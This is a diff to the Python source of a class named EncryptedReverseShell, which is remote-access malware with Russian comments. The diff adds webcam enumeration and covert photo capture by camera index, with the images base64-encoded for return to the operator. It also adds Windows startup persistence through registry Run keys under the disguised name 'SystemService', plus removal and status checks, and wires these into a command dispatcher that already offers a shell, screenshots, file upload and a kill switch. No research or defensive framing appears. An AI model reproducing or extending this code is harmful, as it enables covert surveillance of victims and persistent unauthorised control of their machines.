@@ -251,14 +251,46 @@ class EncryptedReverseShell:
         except Exception as e:
             return {"error": f"Screenshot failed: {str(e)}"}
 
-    def take_camera_photo(self):
+    def list_cameras(self):
+        """Получение списка доступных камер"""
         try:
-            camera = cv2.VideoCapture(0)
-            if not camera.isOpened():
-                return {"error": "Camera not available"}
+            cameras = []
+            for i in range(10):  # Проверяем первые 10 индексов
+                cap = cv2.VideoCapture(i)
+                if cap.isOpened():
+                    # Получаем информацию о камере
+                    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                    fps = cap.get(cv2.CAP_PROP_FPS)
+                    
+                    cameras.append({
+                        "index": i,
+                        "resolution": f"{width}x{height}",
+                        "fps": round(fps, 1) if fps > 0 else "unknown",
+                        "status": "available"
+                    })
+                    cap.release()
             
-            time.sleep(1)
+            if not cameras:
+                return {"error": "No cameras found"}
+            
+            return {"cameras": cameras}
+        except Exception as e:
+            return {"error": f"Camera list failed: {str(e)}"}
+
+    def take_camera_photo(self, camera_index=0):
+        try:
+            camera = cv2.VideoCapture(camera_index)
+            if not camera.isOpened():
+                return {"error": f"Camera {camera_index} not available"}
+            
+            time.sleep(1)  # Даем камере время на инициализацию
             ret, frame = camera.read()
+            
+            # Получаем информацию о камере
+            width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
+            height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
+            
             camera.release()
             
             if not ret:
@@ -271,7 +303,9 @@ class EncryptedReverseShell:
             photo_data = base64.b64encode(buffer).decode('utf-8')
             return {
                 "camera_photo": photo_data,
-                "size": len(photo_data)
+                "size": len(photo_data),
+                "camera_index": camera_index,
+                "resolution": f"{width}x{height}"
             }
         except Exception as e:
             return {"error": f"Camera capture failed: {str(e)}"}
@@ -413,6 +447,9 @@ class EncryptedReverseShell:
         try:
             print("[+] Kill switch activated - self-destructing...")
             
+            # Удаляем из автозагрузки перед уничтожением
+            self.remove_from_startup()
+            
             if getattr(sys, 'frozen', False):
                 current_file = sys.executable
             else:
@@ -440,6 +477,136 @@ class EncryptedReverseShell:
             except:
                 os._exit(1)
 
+    def add_to_startup(self, name="SystemService"):
+        """Добавление в автозагрузку через реестр"""
+        try:
+            if platform.system() != "Windows":
+                return {"error": "Startup registry only available on Windows"}
+            
+            if not self.is_admin():
+                return {"error": "Administrator privileges required for startup registration"}
+            
+            # Получаем путь к текущему исполняемому файлу
+            if getattr(sys, 'frozen', False):
+                executable_path = sys.executable
+            else:
+                executable_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+            
+            # Добавляем в HKEY_CURRENT_USER (не требует админских прав)
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                    0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
+                winreg.CloseKey(key)
+                user_startup = True
+            except Exception as e:
+                user_startup = False
+                return {"error": f"User startup registration failed: {str(e)}"}
+            
+            # Добавляем в HKEY_LOCAL_MACHINE (требует админских прав)
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                                    0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
+                winreg.CloseKey(key)
+                system_startup = True
+            except:
+                system_startup = False
+            
+            return {
+                "success": True,
+                "message": f"Added to startup as '{name}'",
+                "user_startup": user_startup,
+                "system_startup": system_startup
+            }
+            
+        except Exception as e:
+            return {"error": f"Startup registration failed: {str(e)}"}
+    
+    def remove_from_startup(self, name="SystemService"):
+        """Удаление из автозагрузки"""
+        try:
+            if platform.system() != "Windows":
+                return {"error": "Startup registry only available on Windows"}
+            
+            removed = []
+            
+            # Удаляем из HKEY_CURRENT_USER
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                    0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, name)
+                winreg.CloseKey(key)
+                removed.append("HKEY_CURRENT_USER")
+            except:
+                pass
+            
+            # Удаляем из HKEY_LOCAL_MACHINE
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                                    0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, name)
+                winreg.CloseKey(key)
+                removed.append("HKEY_LOCAL_MACHINE")
+            except:
+                pass
+            
+            if removed:
+                return {"success": True, "message": f"Removed from startup: {', '.join(removed)}"}
+            else:
+                return {"message": "Not found in startup"}
+                
+        except Exception as e:
+            return {"error": f"Startup removal failed: {str(e)}"}
+    
+    def check_startup_status(self, name="SystemService"):
+        """Проверка наличия в автозагрузке"""
+        try:
+            if platform.system() != "Windows":
+                return {"error": "Startup registry only available on Windows"}
+            
+            status = {
+                "HKEY_CURRENT_USER": False,
+                "HKEY_LOCAL_MACHINE": False
+            }
+            
+            # Проверяем HKEY_CURRENT_USER
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                    0, winreg.KEY_READ)
+                try:
+                    value, _ = winreg.QueryValueEx(key, name)
+                    status["HKEY_CURRENT_USER"] = True
+                except:
+                    pass
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            # Проверяем HKEY_LOCAL_MACHINE
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                                    0, winreg.KEY_READ)
+                try:
+                    value, _ = winreg.QueryValueEx(key, name)
+                    status["HKEY_LOCAL_MACHINE"] = True
+                except:
+                    pass
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            return {"startup_status": status}
+            
+        except Exception as e:
+            return {"error": f"Startup check failed: {str(e)}"}
+
     def execute_command(self, command_data):
         try:
             if isinstance(command_data, str):
@@ -451,6 +618,8 @@ class EncryptedReverseShell:
                 upload_data = command_data.get("upload_data")
                 target_path = command_data.get("target_path")
                 file_name = command_data.get("file_name")
+                camera_index = command_data.get("camera_index", 0)
+                startup_name = command_data.get("startup_name", "SystemService")
             
             if cmd_type == "shell":
                 if command.startswith('cd '):
@@ -491,8 +660,11 @@ class EncryptedReverseShell:
             elif cmd_type == "screenshot":
                 return {"screenshot_result": self.take_screenshot()}
             
+            elif cmd_type == "list_cam":
+                return {"camera_list": self.list_cameras()}
+            
             elif cmd_type == "cam":
-                return {"camera_result": self.take_camera_photo()}
+                return {"camera_result": self.take_camera_photo(camera_index)}
             
             elif cmd_type == "processes":
                 return {"process_list": self.list_processes()}
@@ -518,6 +690,15 @@ class EncryptedReverseShell:
                     return {"upload_result": self.upload_file(upload_data, file_name, target_path)}
                 else:
                     return {"error": "Missing upload data or filename"}
+            
+            elif cmd_type == "add_to_startup":
+                return {"startup_result": self.add_to_startup(startup_name)}
+            
+            elif cmd_type == "remove_from_startup":
+                return {"startup_result": self.remove_from_startup(startup_name)}
+            
+            elif cmd_type == "check_startup":
+                return {"startup_status": self.check_startup_status(startup_name)}
             
             elif cmd_type == "heartbeat":
                 return {"type": "heartbeat", "status": "alive"}
